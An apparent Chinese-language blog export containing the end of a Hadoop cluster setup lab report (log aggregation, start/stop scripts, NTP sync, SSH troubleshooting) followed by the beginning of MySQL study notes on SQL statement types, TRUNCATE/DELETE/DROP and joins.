<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/etc/</span><br></pre></td></tr></table></figure>

<p>3.在 hadoop102 启动历史服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ mapred --daemon start historyserve</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看是否启动</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ jps</span><br><span class="line">29072 JobHistoryServer</span><br><span class="line">29146 Jps</span><br><span class="line">16923 DataNode</span><br><span class="line">16748 NameNode</span><br><span class="line">17454 NodeManager</span><br></pre></td></tr></table></figure>

<h3 id="配置日志的聚集"><a href="#配置日志的聚集" class="headerlink" title="配置日志的聚集"></a>配置日志的聚集</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/module/hadoop-3.1.3/etc/hadoop/</span><br><span class="line">[huang@hadoop102 hadoop]$ vi yarn-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 开启日志聚集功能 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log-aggregation-enable<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 设置日志聚集服务器地址 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log.server.url<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>http://hadoop102:19888/jobhistory/logs<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 设置日志保留时间为 7 天 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log-aggregation.retain-seconds<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>604800<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分发配置</span></span><br><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/etc/hadoop/yarn-site.xml </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启NodeManager 、ResourceManager 和 HistoryServer</span></span><br><span class="line">[huang@hadoop102 hadoop]$ myhadoop.sh stop</span><br><span class="line"> =================== 关闭 hadoop 集群 ===================</span><br><span class="line"> --------------- 关闭 historyserver ---------------</span><br><span class="line"> --------------- 关闭 yarn ---------------</span><br><span class="line">Stopping nodemanagers</span><br><span class="line">Stopping resourcemanager</span><br><span class="line"> --------------- 关闭 hdfs ---------------</span><br><span class="line">Stopping namenodes on [hadoop102]</span><br><span class="line">Stopping datanodes</span><br><span class="line">Stopping secondary namenodes [hadoop104]</span><br><span class="line">[huang@hadoop102 hadoop]$ myhadoop.sh start</span><br><span class="line"> =================== 启动 hadoop 集群 ===================</span><br><span class="line"> --------------- 启动 hdfs ---------------</span><br><span class="line">Starting namenodes on [hadoop102]</span><br><span class="line">Starting datanodes</span><br><span class="line">Starting secondary namenodes [hadoop104]</span><br><span class="line"> --------------- 启动 yarn ---------------</span><br><span class="line">Starting resourcemanager</span><br><span class="line">Starting nodemanagers</span><br><span class="line"> --------------- 启动 historyserver ---------------</span><br></pre></td></tr></table></figure>



<h3 id="集群启动和停止方式"><a href="#集群启动和停止方式" class="headerlink" title="集群启动和停止方式"></a>集群启动和停止方式</h3><h4 id="各个模块分开启动-x2F-停止（配置ssh是前提）常用"><a href="#各个模块分开启动-x2F-停止（配置ssh是前提）常用" class="headerlink" title="各个模块分开启动&#x2F;停止（配置ssh是前提）常用"></a>各个模块分开启动&#x2F;停止（配置ssh是前提）常用</h4><p>1.整体启动&#x2F;停止HDFS</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-dfs.sh/stop-dfs.sh</span><br></pre></td></tr></table></figure>

<p>2.整体启动&#x2F;停止YARN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-yarn.sh/stop-yarn.sh</span><br></pre></td></tr></table></figure>

<h4 id="各个服务逐一启动-x2F-停止"><a href="#各个服务逐一启动-x2F-停止" class="headerlink" title="各个服务逐一启动&#x2F;停止"></a>各个服务逐一启动&#x2F;停止</h4><p>1.分别启动&#x2F;停止HDFS组件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hdfs --daemon start/stop namenode/datanode/secondarynamenode</span><br></pre></td></tr></table></figure>

<p>2.启动&#x2F;停止YARN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn --daemon start/stop resourcemanager/nodemanager</span><br></pre></td></tr></table></figure>

<h3 id="编写Hadoop集群常用脚本"><a href="#编写Hadoop集群常用脚本" class="headerlink" title="编写Hadoop集群常用脚本"></a>编写Hadoop集群常用脚本</h3><h4 id="Hadoop-集群启停脚本-包含-HDFS，Yarn，Historyserver-myhadoop-sh"><a href="#Hadoop-集群启停脚本-包含-HDFS，Yarn，Historyserver-myhadoop-sh" class="headerlink" title="Hadoop 集群启停脚本(包含 HDFS，Yarn，Historyserver):myhadoop.sh"></a>Hadoop 集群启停脚本(包含 HDFS，Yarn，Historyserver):myhadoop.sh</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /home/huang/bin/</span><br><span class="line">[huang@hadoop102 bin]$ vi myhadoop.sh</span><br></pre></td></tr></table></figure>

<p>文件内容如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">if [ $# -lt 1 ]</span><br><span class="line">then</span><br><span class="line">		echo &quot;No Args Input...&quot;</span><br><span class="line">		exit ; </span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">case $1 in </span><br><span class="line">&quot;start&quot;)</span><br><span class="line">	echo &quot; =================== 启动 hadoop 集群 ===================&quot;</span><br><span class="line">	echo &quot; --------------- 启动 hdfs ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/sbin/start-dfs.sh&quot; </span><br><span class="line">	echo &quot; --------------- 启动 yarn ---------------&quot;</span><br><span class="line">	ssh hadoop103 &quot;/opt/module/hadoop-3.1.3/sbin/start-yarn.sh&quot;</span><br><span class="line">	echo &quot; --------------- 启动 historyserver ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/bin/mapred --daemon start historyserver&quot;</span><br><span class="line">;;</span><br><span class="line">&quot;stop&quot;)</span><br><span class="line">	echo &quot; =================== 关闭 hadoop 集群 ===================&quot;</span><br><span class="line">	echo &quot; --------------- 关闭 historyserver ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/bin/mapred --daemon stop historyserver&quot;</span><br><span class="line">	echo &quot; --------------- 关闭 yarn ---------------&quot;</span><br><span class="line">	ssh hadoop103 &quot;/opt/module/hadoop-3.1.3/sbin/stop-yarn.sh&quot; </span><br><span class="line">	echo &quot; --------------- 关闭 hdfs ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/sbin/stop-dfs.sh&quot;</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">   echo &quot;Input Args Error...&quot;</span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">赋予脚本执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x myhadoop.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将脚本复制到/bin，以便全局调用</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp myhadoop.sh /bin/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分发脚本</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /home/huang/bin/</span><br></pre></td></tr></table></figure>

<h4 id="查看三台服务器Java进程脚本：jpsall"><a href="#查看三台服务器Java进程脚本：jpsall" class="headerlink" title="查看三台服务器Java进程脚本：jpsall"></a>查看三台服务器Java进程脚本：jpsall</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /home/huang/bin/</span><br><span class="line">[huang@hadoop102 bin]$ vi jpsall</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 </span><br><span class="line">do</span><br><span class="line">	echo =============== $host ===============</span><br><span class="line">  ssh $host jps</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">赋予执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x jpsall</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将脚本复制到/bin，以便全局调用</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp jpsall /bin/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分发脚本</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /home/huang/bin/</span><br></pre></td></tr></table></figure>

<h3 id="常用端口号"><a href="#常用端口号" class="headerlink" title="常用端口号"></a>常用端口号</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115386.png" alt="image-20210628130455175"></p>
<h3 id="集群内时间同步"><a href="#集群内时间同步" class="headerlink" title="集群内时间同步"></a>集群内时间同步</h3><p>如果服务器在公网环境(能连接外网)，可以不采用集群时间同步，因为服务器会定期 和公网时间进行校准;</p>
<p>如果服务器在内网环境，必须要配置集群时间同步，否则时间久了，会产生时间偏差， 导致集群执行任务时间不同步。</p>
<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>找一个机器，作为时间服务器，所有的机器与这台集群时间进行定时的同步，生产环境根据任务对时间的准确程度要求周期同步。测试环境为了尽快看到效果，采用 1 分钟同步一 次。</p>
<h4 id="时间服务器配置（必须root用户）"><a href="#时间服务器配置（必须root用户）" class="headerlink" title="时间服务器配置（必须root用户）"></a>时间服务器配置（必须root用户）</h4><p>1.查看所有节点 ntpd 服务状态和开机自启动状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo systemctl status ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl start ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl is-enabled ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl status ntpd</span><br></pre></td></tr></table></figure>

<p>2.修改hadoop102的ntp.conf配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/ntp.conf </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Hosts on <span class="built_in">local</span> network are less restricted.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">授权 192.168.58.0-192.168.58.255 网段上的所有机器可以从这台机器上查询和同步时间</span></span><br><span class="line">restrict 192.168.58.0 mask 255.255.255.0 nomodify notrap</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Use public servers from the pool.ntp.org project.</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">集群在局域网中不使用其他互联网上的时间，下面4个都注释掉</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server 127.127.1.0 #127.127.1.0 不是IP 地址。 它是一种格式，用来引用向服务器提供准确时间的时钟。</span><br><span class="line">fudge 127.127.1.0 stratum 10</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/sysconfig/ntpd</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">增加内容如下（让硬件时间与系统时间一起同步）</span></span><br><span class="line">SYNC_HWCLOCK=yes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动ntpd</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl start ntpd</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置开机自启</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl enable ntpd</span><br></pre></td></tr></table></figure>

<p>3.其他机器配置（必须root用户,已hadoop103为例）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop103 ~]$ sudo systemctl stop ntpd</span><br><span class="line">[huang@hadoop103 ~]$ sudo systemctl disable ntpd</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ sudo crontab -e</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编写内容如下</span></span><br><span class="line">*/1 * * * * /usr/sbin/ntpdate hadoop102</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">任意修改机器时间</span></span><br><span class="line">[huang@hadoop103 ~]$ sudo date -s &quot;2021-9-9 11:11:11&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">一分钟后查看</span></span><br><span class="line">[huang@hadoop103 ~]$ sudo date</span><br></pre></td></tr></table></figure>

<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><h2 id="jpsall脚本查看9个服务器的状态"><a href="#jpsall脚本查看9个服务器的状态" class="headerlink" title="jpsall脚本查看9个服务器的状态"></a>jpsall脚本查看9个服务器的状态</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115387.png" alt="image-20210701175214061"></p>
<p>与集群规划一致：</p>
<p><strong>MacBook Pro(Rack1):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th align="left">hadoop102</th>
<th align="left">hadoop109</th>
<th>hadoop110</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td align="left">NameNode DataNode</td>
<td align="left">DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td align="left">NodeManager</td>
<td align="left">NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<p><strong>Window 10-1(Rack2):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>hadoop103</th>
<th>hadoop107</th>
<th>hadoop108</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td>ResourceManager NodeManger</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<p><strong>Window 10-2(Rack3):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>hadoop104</th>
<th>hadoop105</th>
<th>hadoop106</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>SecondaryNameNode DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td>NodeManager</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<h2 id="9个节点均为激活状态"><a href="#9个节点均为激活状态" class="headerlink" title="9个节点均为激活状态"></a>9个节点均为激活状态</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115388.png" alt="截屏2021-07-01 下午5.59.03 (2)"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115389.png" alt="截屏2021-07-01 下午6.00.51 (2)"></p>
<h2 id="节点副本数设置为9"><a href="#节点副本数设置为9" class="headerlink" title="节点副本数设置为9"></a>节点副本数设置为9</h2><p>此时副本数为9个</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115390.png" alt="截屏2021-07-01 下午6.02.08 (2)"></p>
<h2 id="执行wordcount"><a href="#执行wordcount" class="headerlink" title="执行wordcount"></a>执行wordcount</h2><p>word.txt:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115391.png" alt="image-20210701182926457"></p>
<p>执行：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115392.png" alt="截屏2021-07-01 下午6.07.43 (2)"></p>
<p>查看结果：</p>
<p>任务历史：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115393.png" alt="截屏2021-07-01 下午6.11.54 (2)"></p>
<p>日志：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115394.png" alt="截屏2021-07-01 下午6.12.27 (2)"></p>
<p>结果3个副本在hadoop106，hadoop109，hadoop5:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115395.png" alt="截屏2021-07-01 下午6.20.19 (2)"></p>
<p>去hadoop105,hadoop106,hadoop109查看：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115396.png" alt="截屏2021-07-01 下午6.27.12 (2)"></p>
<h2 id="四、实验遇到的问题及解决方法"><a href="#四、实验遇到的问题及解决方法" class="headerlink" title="四、实验遇到的问题及解决方法"></a>四、实验遇到的问题及解决方法</h2><h2 id="ssh连不上"><a href="#ssh连不上" class="headerlink" title="ssh连不上"></a>ssh连不上</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115397.png" alt="截屏2021-07-01 下午2.16.19"></p>
<p>原因：之前在本地配置过ssh无密码登陆，现在ip地址变了，之前的hadoop103已经换了主机，所以才会等不上</p>
<p>解决方案：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">把.ssh文件夹下的东西都删掉</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mac</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro Documents % cd /Users/huangmingwang/.ssh </span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro .ssh % rm -rf known_hosts </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">hadoop102</span></span><br><span class="line">[huang@hadoop102 ~]$ cd .ssh</span><br><span class="line">[huang@hadoop102 .ssh]$ rm -rf *</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ cd /home/huang/.ssh</span><br><span class="line">[huang@hadoop102 .ssh]$ rm -rf *</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">hadoop103</span></span><br><span class="line">[huang@hadoop103 ~]$ cd .ssh</span><br><span class="line">[huang@hadoop103 .ssh]$ rm -rf *</span><br><span class="line"></span><br><span class="line">[huang@hadoop103 ~]$ cd /home/huang/.ssh</span><br><span class="line">[huang@hadoop103 .ssh]$ rm -rf *</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">hadoop104</span></span><br><span class="line">[huang@hadoop104 ~]$ cd .ssh</span><br><span class="line">[huang@hadoop104 .ssh]$ rm -rf *</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ cd /home/huang/.ssh</span><br><span class="line">[huang@hadoop104 .ssh]$ rm -rf *</span><br></pre></td></tr></table></figure>



<h2 id="Hadoop102-root账号无密码登陆其他主机失败"><a href="#Hadoop102-root账号无密码登陆其他主机失败" class="headerlink" title="Hadoop102 root账号无密码登陆其他主机失败"></a>Hadoop102 root账号无密码登陆其他主机失败</h2><p>原因：在&#x2F;home&#x2F;huang&#x2F;.ssh配置的无密码登陆，在root用户下用不了</p>
<p>解决方法：</p>
<p>在进去root根目录下的.ssh进行配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成公钥和私钥</span></span><br><span class="line">[huang@hadoop102 huang]$ cd /root/.ssh</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-keygen -t rsa</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">按三下回车就会生成rsa文件</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将公钥拷贝到要免密登陆的目标机器上</span></span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop102</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop103</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop104</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop105</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop106</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop107</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop108</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop109</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop110</span><br></pre></td></tr></table></figure>

<h3 id="修改配置后重启服务发现DataNode和NameNode进程只能重启一个"><a href="#修改配置后重启服务发现DataNode和NameNode进程只能重启一个" class="headerlink" title="修改配置后重启服务发现DataNode和NameNode进程只能重启一个"></a>修改配置后重启服务发现DataNode和NameNode进程只能重启一个</h3><p>因为NameNode在format初始化后会生成clusterId（集群ID），DateNode在启动后会生成和NameNode一样的clusterId（集群ID），再次格式化NameNode，生成新的clusterid，与未删除DataNode的clusterid不一致，集群找不到已往数据。</p>
<p>解决方法：</p>
<p>需要重新格式化 NameNode 的话，<strong>一定要先停止所有机器的NameNode 和 DataNode 进程，并且要删除所有机器的 data 和 logs 目录，然后再进行格式化</strong>。</p>
<h2 id="xsync脚本只能同步修改，不能删除文件夹"><a href="#xsync脚本只能同步修改，不能删除文件夹" class="headerlink" title="xsync脚本只能同步修改，不能删除文件夹"></a>xsync脚本只能同步修改，不能删除文件夹</h2><p>hdfs启动失败后，在hadoop上删除data和logs，然后用xsync同步文件夹，本以为其他主机也会同步删除，然后又接着格式NameNode，重启集群，但还是有几个datanode连不上，因为其他节点的data数据还在，造成格式化后集群id不一样，然后连不上</p>
<p>解决方案：</p>
<p>去每个节点上删除data和logs文件夹，然后再格式化NameNode，重启集群即可</p>
]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL</title>
    <url>/2022/02/15/MySQL/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151504917.png" alt="image-20210423222127334"></p>
<h2 id="DML、DDL、DCL区别以及定义"><a href="#DML、DDL、DCL区别以及定义" class="headerlink" title="DML、DDL、DCL区别以及定义"></a>DML、DDL、DCL区别以及定义</h2><p>结构化查询语言（Structured Query Language，SQL）是用于管理关系数据库管理系统（RDBMS）。 SQL 的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。</p>
<p>数据操作语言（Data Manipulation Language，DML）用于检索或者修改数据。DML包括：SELECT、DELETE、 UPDATE和INSERT。</p>
<p>数据定义语言（Data Definition Language，DDL）用于定义数据的结构，比如创建、修改或者删除数据库对象DDL包括：CREATE TABLE、ALTER TABLE、DROP TABLE、CREATE INDEX、DROP INDEX和TRUNCATE TABLE。</p>
<p>数据控制语言（Data Control Language，DCL）用于定于数据库用户的权限。DCL包括：ALTER PASSWORD、GRANT、REVOKE 和CREATE SYNONYM。</p>
<h2 id="TRUNCATE、DELETE和DROP的区别"><a href="#TRUNCATE、DELETE和DROP的区别" class="headerlink" title="TRUNCATE、DELETE和DROP的区别"></a>TRUNCATE、DELETE和DROP的区别</h2><ul>
<li>truncate table类似于delete删除所有行的语句或drop table然后再create table语句的组合。</li>
<li>truncate为了实现高性能，它绕过了删除数据的DML方法，因此，它不能回滚。</li>
<li>truncate会清空所有数据且执行速度很快。</li>
<li>truncate不能对有外键约束引用的表使用。</li>
<li>执行truncate需要drop权限，不建议给账号drop权限。</li>
<li>执行truncate前一定要再三检查确认，最好提前备份下表数据。</li>
<li>truncate与drop是DDL语句，执行后无法通过binlog回滚；delete是DML语句，可回滚。</li>
<li>truncate只能作用于表；delete，drop可作用于表、视图等。</li>
<li>truncate删除没有返回值；delete删除有返回值。</li>
<li>truncate删除后插入从0开始；delete从删除时的下一个位置开始；</li>
<li>truncate会清空表中的所有行，但表结构及其约束、索引等保持不变；drop会删除表的结构及其所依赖的约束、索引等。</li>
<li>truncate不会激活与表有关的删除触发器；delete可以。</li>
<li>truncate后会使表和索引所占用的空间会恢复到初始大小；delete操作不会减少表或索引所占用的空间；drop语句将表所占用的空间全释放掉。</li>
<li>在InnoDB中，delete操作并不会真的删除数据，mysql实际上只是给要删除的数据打了标记，标记为删除。磁盘所占空间不会变小，即表空间并没有真正被释放。</li>
</ul>
<h2 id="交叉连接、内连接、外连接、联合连接和自然连接"><a href="#交叉连接、内连接、外连接、联合连接和自然连接" class="headerlink" title="交叉连接、内连接、外连接、联合连接和自然连接"></a>交叉连接、内连接、外连接、联合连接和自然连接</h2><h3 id="交叉连接（CROSS-JOIN）"><a href="#交叉连接（CROSS-JOIN）" class="headerlink" title="交叉连接（CROSS JOIN）"></a>交叉连接（CROSS JOIN）</h3><p> 交叉连接（CROSS JOIN）：有两种，显式的和隐式的，不带ON子句（在MySQL支持ON，和INNER JOIN等价），返回的是两表的乘积，也叫笛卡尔积。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 隐式的交叉连接</span><br><span class="line"><span class="keyword">select</span> a.qq, b.name <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a, `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">where</span> a.id <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"># 显式的交叉连接</span><br><span class="line"><span class="keyword">select</span> a.qq, b.name <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">cross</span> <span class="keyword">join</span> `<span class="keyword">user</span>` b <span class="keyword">where</span> a.id <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="内连接（INNER-JOIN）"><a href="#内连接（INNER-JOIN）" class="headerlink" title="内连接（INNER JOIN）"></a>内连接（INNER JOIN）</h3><p>内连接（INNER JOIN）：有两种，显式的和隐式的，返回连接表中符合连接条件和查询条件的数据行。（所谓的链接表就是数据库在做查询形成的中间表）。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 隐式的内连接，没有<span class="keyword">INNER</span> <span class="keyword">JOIN</span>，形成的中间表为两个表的笛卡尔积。</span><br><span class="line"><span class="keyword">select</span> a.qq, b.name <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a, `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">where</span> a.id <span class="operator">=</span> b.id</span><br><span class="line"></span><br><span class="line"># 显示的内连接，一般称为内连接，有<span class="keyword">INNER</span> <span class="keyword">JOIN</span>，形成的中间表为两个表经过<span class="keyword">ON</span>条件过滤后的笛卡尔积。</span><br><span class="line"><span class="keyword">select</span> a.qq, b.name <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">inner</span> <span class="keyword">join</span> `<span class="keyword">user</span>` b <span class="keyword">on</span> a.id <span class="operator">=</span> b.id</span><br></pre></td></tr></table></figure>

<h3 id="外连接（OUTER-JOIN）"><a href="#外连接（OUTER-JOIN）" class="headerlink" title="外连接（OUTER JOIN）"></a>外连接（OUTER JOIN）</h3><p>外连接（OUTER JOIN）不但返回符合连接和查询条件的数据行，还返回不符合条件的一些行。外连接分三类：左外连接（LEFT OUTER JOIN）、右外连接（RIGHT OUTER JOIN）和全外连接（FULL OUTER JOIN）。在三种类型的外连接中，OUTER 关键字是可省略的。 </p>
<p>三者的共同点是都返回符合连接条件和查询条件（即：内连接）的数据行。</p>
<p>不同点如下： </p>
<ul>
